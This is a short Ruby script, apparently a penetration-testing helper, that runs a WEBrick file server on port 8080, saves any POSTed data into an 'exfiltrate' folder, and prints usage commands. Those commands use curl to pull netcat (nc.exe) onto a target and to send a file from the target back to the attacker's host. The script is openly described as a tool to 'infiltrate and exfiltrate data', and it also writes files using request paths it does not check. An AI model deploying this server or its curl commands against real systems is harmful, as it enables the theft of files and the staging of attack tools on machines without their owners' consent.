#! /usr/bin/env ruby

require 'webrick'
require 'byebug'

class SendAndReciv < WEBrick::HTTPServlet::AbstractServlet
  def do_GET(request, response)
    Dir.pwd
  end

  def do_POST(request, response)
    dir = "exfiltrate"
    Dir.mkdir(dir) unless Dir.exists?(dir)

    file_name = request.path.split("/")[1]
    File.open("./#{dir}/#{file_name}", 'w') { |file| file.write(request.body) }
  end
end

puts ""
puts "================="
puts "Serve current directory and save file from post request body"
puts "Simple file server to infiltrate and exfiltrate data"
puts ""
puts "GET: curl $IP/nc.exe > nc.exe"
puts "POST: curl $IP/filename.txt --databinary @file_on_target.txt"
puts "================="
puts ""

server = WEBrick::HTTPServer.new(:Port => 8080)
server.mount "/", SendAndReciv

server.start
